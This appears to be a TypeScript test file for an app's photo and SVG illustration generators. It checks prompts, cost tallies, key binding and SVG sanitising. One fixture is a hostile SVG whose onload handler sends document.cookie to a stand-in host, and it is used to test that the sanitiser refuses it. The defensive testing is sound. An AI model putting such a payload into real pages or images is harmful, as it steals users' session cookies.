// The two picture makers (./makers.ts) on the Assistant's state with
// providers of the test's own, what finishes a picture in the browser
// given here: a photo asked of the image model at the size of its shape
// and the quality chosen, in the plan's words and the two rules, its bytes
// read; an illustration asked of the model chosen, counted as one, its SVG
// cleaned before it is drawn, a hostile one refused with what it cost, a
// fenced one taken out of its fence. A run's pictures go with the key it
// began with, and none with another once that key goes.
import { expect, test } from "vitest";
import { FakeClock } from "../../test/fake-clock.ts";
import { anthropic, type AnthropicLike } from "./anthropic.ts";
import type { PictureAsk } from "./build.ts";
import { createAssistant, KEY_GONE } from "./context.tsx";
import type { Finished } from "./draw.ts";
import type { ProviderId } from "./key.ts";
import { illustrationMaker, photoMaker, svgOf } from "./makers.ts";
import { openai, type OpenAILike } from "./openai.ts";
import type { PhotoAsk, ProviderClient, Question } from "./providers.ts";
import { PictureError } from "./write.ts";

const KEY = "sk-not-a-real-key-mnop";
const PALETTE = { text: "#0e2a35", background: "#ffffff", primary: "#1d4e6f", accent: "#f2a541", soft: "#e9f2ef", muted: "#5a5f63" };
const ask = (shape: PictureAsk["shape"]): PictureAsk => ({ key: "made-1", sectionId: "s1", label: "Hero", called: "the section “Hero”", place: { behind: true }, prompt: "Rowers at dawn.", alt: "Rowers", shape });
const CLEAN = "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 600 400\"><rect width=\"600\" height=\"400\" fill=\"#e9f2ef\"/><circle cx=\"300\" cy=\"200\" r=\"80\" fill=\"#f2a541\"/></svg>";
const HOSTILE = "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 600 400\" onload=\"fetch('https://x.example/'+document.cookie)\"><rect width=\"600\" height=\"400\"/></svg>";

async function connected(client: ProviderClient, provider: "anthropic" | "openai") {
  const store = createAssistant(new FakeClock(), async () => client);
  await store.getState().connect(provider, KEY);
  return store;
}

test("a photo: the image model asked at the size of its shape and the quality chosen, in the plan's words and the two rules; its bytes read; what it used priced", async () => {
  const asked: PhotoAsk[] = [];
  const client: ProviderClient = {
    models: async () => [{ id: "gpt-6.1-sol", name: "gpt-6.1-sol" }],
    ask: async () => ({ text: "{}", usage: { input: 0, cacheRead: 0, cacheWrite: 0, output: 0 } }),
    photos: {
      model: async () => "gpt-image-2",
      async make(_key, photo) {
        asked.push(photo);
        return { base64: "UklGRgAAAABXRUJQ", usage: { textInput: 50, imageInput: 0, output: 1372 } };
      },
    },
  };
  const store = await connected(client, "openai");
  const read: Array<number[]> = [];
  const finish = async (bytes: Uint8Array): Promise<Finished> => {
    read.push([...bytes]);
    return { blob: new Blob([bytes as Uint8Array<ArrayBuffer>]), type: "image/webp", width: 1024, height: 1536 };
  };
  const bound = store.getState().bind()!;
  const made = await photoMaker(store, bound, "high", finish).make(ask("portrait"), new AbortController().signal);
  expect(asked).toEqual([{ model: "gpt-image-2", size: "1024x1536", quality: "high", prompt: expect.stringMatching(/^Rowers at dawn\.\n\nA photograph for a web page\. Never text in a picture/) as unknown as string }]);
  expect(read).toEqual([[...new TextEncoder().encode("RIFF\0\0\0\0WEBP")]]);
  expect(made).toMatchObject({ type: "image/webp", width: 1024, height: 1536, tally: [{ kind: "photo", cost: { nano: 41_410_000 } }] });
  // Bytes that are no picture: said, with what the photo cost.
  const refused = await photoMaker(store, bound, "low", async () => {
    throw new Error("it is not a WebP, PNG or JPEG picture");
  }).make(ask("square"), new AbortController().signal).catch((error: unknown) => error);
  expect(refused).toBeInstanceOf(PictureError);
  expect(refused).toMatchObject({ message: "what came back could not be used: it is not a WebP, PNG or JPEG picture.", tally: [{ kind: "photo" }] });
});

function drawer(answers: string[]) {
  const questions: Question[] = [];
  const client: ProviderClient = {
    models: async () => [{ id: "claude-opus-5-5", name: "Claude Opus 5.5" }],
    async ask(_key, question) {
      questions.push(question);
      const text = JSON.stringify({ svg: answers.shift() ?? "" });
      return { text, usage: { input: 900, cacheRead: 0, cacheWrite: 0, output: 2100 } };
    },
  };
  return { client, questions };
}

test("an illustration: the model chosen draws it in the palette, counted as an illustration; its SVG cleaned, then drawn at the size of its shape", async () => {
  const { client, questions } = drawer([CLEAN]);
  const store = await connected(client, "anthropic");
  const drawn: Array<[string, { width: number; height: number }]> = [];
  const draw = async (svg: string, size: { width: number; height: number }): Promise<Finished> => {
    drawn.push([svg, size]);
    return { blob: new Blob(["webp"]), type: "image/webp", ...size };
  };
  const made = await illustrationMaker(store, store.getState().bind()!, PALETTE, draw).make(ask("landscape"), new AbortController().signal);
  expect(questions[0]).toMatchObject({ model: "claude-opus-5-5", name: "illustration", text: "The illustration shows: Rowers at dawn." });
  expect(questions[0]!.system).toContain("text #0e2a35, background #ffffff, primary #1d4e6f, accent #f2a541, soft #e9f2ef, muted #5a5f63");
  expect(drawn).toEqual([[
    "<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 600 400\" width=\"1536\" height=\"1024\" preserveAspectRatio=\"xMidYMid slice\"><rect width=\"600\" height=\"400\" fill=\"#e9f2ef\"/><circle cx=\"300\" cy=\"200\" r=\"80\" fill=\"#f2a541\"/></svg>",
    { width: 1536, height: 1024 },
  ]]);
  // 900 × $4 + 2,100 × $20 a million tokens, an illustration's.
  expect(made).toMatchObject({ type: "image/webp", width: 1536, height: 1024, tally: [{ kind: "illustration", cost: { nano: 45_600_000 } }] });
  expect(store.getState().spent).toMatchObject([{ kind: "illustration", calls: 1 }]);
});

test("a new site's imagery goes with each picture: in a photo's prompt, and in an illustration's question", async () => {
  const asked: PhotoAsk[] = [];
  const photos: ProviderClient = {
    models: async () => [{ id: "gpt-6.1-sol", name: "gpt-6.1-sol" }],
    ask: async () => ({ text: "{}", usage: { input: 0, cacheRead: 0, cacheWrite: 0, output: 0 } }),
    photos: {
      model: async () => "gpt-image-2",
      async make(_key, photo) {
        asked.push(photo);
        return { base64: "UklGRgAAAABXRUJQ", usage: null };
      },
    },
  };
  const store = await connected(photos, "openai");
  const finish = async (bytes: Uint8Array): Promise<Finished> => ({ blob: new Blob([bytes as Uint8Array<ArrayBuffer>]), type: "image/webp", width: 1024, height: 1024 });
  await photoMaker(store, store.getState().bind()!, "low", finish, "Warm, contrasty photos of people training.").make(ask("square"), new AbortController().signal);
  expect(asked[0]!.prompt).toMatch(/^Rowers at dawn\.\n\nThe site's imagery: Warm, contrasty photos of people training\.\n\nA photograph for a web page\./);

  const { client, questions } = drawer([CLEAN]);
  const drawing = await connected(client, "anthropic");
  const draw = async (_svg: string, size: { width: number; height: number }): Promise<Finished> => ({ blob: new Blob(["webp"]), type: "image/webp", ...size });
  await illustrationMaker(drawing, drawing.getState().bind()!, PALETTE, draw, "Bold flat shapes, two colours each.").make(ask("landscape"), new AbortController().signal);
  expect(questions[0]!.system).toContain("- The site's imagery, which it keeps to as far as flat shapes can: Bold flat shapes, two colours each.");
});

test("a hostile illustration is never drawn: refused, said why, with what it cost; an answer with no SVG is said too", async () => {
  const { client } = drawer([HOSTILE, "not json either"]);
  const store = await connected(client, "anthropic");
  let drawn = 0;
  const draw = async (): Promise<Finished> => {
    drawn += 1;
    throw new Error("not to be drawn");
  };
  const bound = store.getState().bind()!;
  const refused = await illustrationMaker(store, bound, PALETTE, draw).make(ask("landscape"), new AbortController().signal).catch((error: unknown) => error);
  expect(refused).toBeInstanceOf(PictureError);
  expect(refused).toMatchObject({ message: "it was not clean: its svg element has onload, which an illustration here may not have.", tally: [{ kind: "illustration", calls: 1 }] });
  expect(drawn).toBe(0);
  const empty = await illustrationMaker(store, bound, PALETTE, draw).make(ask("square"), new AbortController().signal).catch((error: unknown) => error);
  expect(empty).toMatchObject({ message: "it was not clean: it is not written as an SVG document." });
  expect(drawn).toBe(0);
});

test("a run's pictures go with the key it began with: once that key is forgotten and another kept, the rest are refused, never asked of the new provider, nor counted toward its key", async () => {
  const asked: Array<[ProviderId, string]> = [];
  const used = { input: 900, cacheRead: 0, cacheWrite: 0, output: 2100 };
  const clients: Record<ProviderId, ProviderClient> = {
    anthropic: {
      models: async () => [{ id: "claude-opus-5-5", name: "Claude Opus 5.5" }],
      async ask(key) {
        asked.push(["anthropic", key]);
        return { text: JSON.stringify({ svg: CLEAN }), usage: used };
      },
    },
    openai: {
      models: async () => [{ id: "gpt-6.1-sol", name: "gpt-6.1-sol" }],
      async ask(key) {
        asked.push(["openai", key]);
        return { text: JSON.stringify({ svg: CLEAN }), usage: used };
      },
      photos: {
        model: async () => "gpt-image-2",
        async make(key) {
          asked.push(["openai", key]);
          return { base64: "UklGRgAAAABXRUJQ", usage: { textInput: 50, imageInput: 0, output: 1372 } };
        },
      },
    },
  };
  const store = createAssistant(new FakeClock(), async (id) => clients[id]);
  const finish = async (): Promise<Finished> => ({ blob: new Blob(["webp"]), type: "image/webp", width: 1024, height: 1024 });
  const signal = new AbortController().signal;

  // An Anthropic run: its first illustration goes with its key.
  await store.getState().connect("anthropic", KEY);
  const drawn = illustrationMaker(store, store.getState().bind()!, PALETTE, finish);
  await drawn.make(ask("square"), signal);
  expect([asked, drawn.gone?.aborted]).toEqual([[["anthropic", KEY]], false]);
  // The key forgotten, OpenAI's connected: the run is told, and asks no more, of either.
  store.getState().forget();
  expect(drawn.gone?.aborted).toBe(true);
  await store.getState().connect("openai", "sk-openai-not-a-real-key-qrst");
  await expect(drawn.make(ask("square"), signal)).rejects.toMatchObject({ kind: "key", message: KEY_GONE });
  expect(asked).toEqual([["anthropic", KEY]]);
  expect(store.getState().spent).toEqual([]);

  // An OpenAI run the same: its photos go with its key, then no more once another key is kept.
  const photos = photoMaker(store, store.getState().bind()!, "low", finish);
  await photos.make(ask("square"), signal);
  expect(asked.at(-1)).toEqual(["openai", "sk-openai-not-a-real-key-qrst"]);
  await store.getState().connect("anthropic", KEY);
  expect(photos.gone?.aborted).toBe(true);
  await expect(photos.make(ask("square"), signal)).rejects.toMatchObject({ kind: "key", message: KEY_GONE });
  expect(asked).toHaveLength(2);
  expect(store.getState().spent).toEqual([]);
});

// The SDKs' clients as the provider modules see them, each request's
// options kept: what the makers ask goes through the real modules.
function sdks() {
  const sent: Array<{ what: string; maxRetries: number | undefined }> = [];
  const usage = { input_tokens: 900, cache_read_input_tokens: 0, cache_creation_input_tokens: 0, output_tokens: 2100 };
  const anthropicSdk = (): AnthropicLike => ({
    models: {
      async *list() {
        yield { id: "claude-opus-5-5", display_name: "Claude Opus 5.5", created_at: "2026-08-01T00:00:00Z" };
      },
    },
    messages: {
      stream(body, options) {
        const svg = JSON.stringify(body.output_config?.format).includes("\"svg\"");
        sent.push({ what: svg ? "illustration" : "page", maxRetries: (options as { maxRetries?: number } | undefined)?.maxRetries });
        return {
          on: () => undefined,
          finalMessage: async () => ({ stop_reason: "end_turn", content: [{ type: "text", text: svg ? JSON.stringify({ svg: CLEAN }) : "{}" }], usage }) as never,
        };
      },
    },
  });
  const openaiSdk = (): OpenAILike => ({
    models: {
      async *list() {
        yield { id: "gpt-6.1-sol", created: 2 };
        yield { id: "gpt-image-2", created: 1 };
      },
    },
    chat: { completions: { create: () => Promise.reject(new Error("No question here.")) } },
    images: {
      async generate(_body, options) {
        sent.push({ what: "photo", maxRetries: (options as { maxRetries?: number } | undefined)?.maxRetries });
        return { created: 1, data: [{ b64_json: "UklGRgAAAABXRUJQ" }], usage: { input_tokens: 50, input_tokens_details: { text_tokens: 50, image_tokens: 0 }, output_tokens: 1372, total_tokens: 1422 } } as never;
      },
    },
  });
  return { sent, load: async (id: ProviderId): Promise<ProviderClient> => (id === "anthropic" ? anthropic(anthropicSdk) : openai(openaiSdk)) };
}

test("a picture is asked once: neither maker's request is tried again behind the person's back (one that timed out may have been billed), while the page's own may be", async () => {
  const finish = async (): Promise<Finished> => ({ blob: new Blob(["webp"]), type: "image/webp", width: 1024, height: 1024 });
  const signal = new AbortController().signal;
  const { sent, load } = sdks();
  const store = createAssistant(new FakeClock(), load);

  await store.getState().connect("anthropic", KEY);
  const drawing = store.getState().bind()!;
  await store.getState().ask((model) => ({ model, system: "", text: "", schema: {}, name: "page_plan", maxTokens: 1, effort: "low" }), () => undefined, signal, "words", drawing);
  await illustrationMaker(store, drawing, PALETTE, finish).make(ask("square"), signal);

  await store.getState().connect("openai", KEY);
  await photoMaker(store, store.getState().bind()!, "low", finish).make(ask("square"), signal);

  // The page's request keeps the client's own retry; each picture's has none.
  expect(sent).toEqual([{ what: "page", maxRetries: undefined }, { what: "illustration", maxRetries: 0 }, { what: "photo", maxRetries: 0 }]);
});

test("the SVG of an answer: its one key, out of a code fence a model put around it; nothing for an answer that is not one", () => {
  expect(svgOf(JSON.stringify({ svg: CLEAN }))).toBe(CLEAN);
  expect(svgOf(JSON.stringify({ svg: `\`\`\`svg\n${CLEAN}\n\`\`\`` }))).toBe(CLEAN);
  expect(svgOf(JSON.stringify({ svg: `\`\`\`\n${CLEAN}\`\`\`` }))).toBe(CLEAN);
  for (const text of ["", "<svg/>", "{\"svg\": 4}", "{\"picture\": \"<svg/>\"}", "null"]) expect(svgOf(text), text).toBeNull();
});
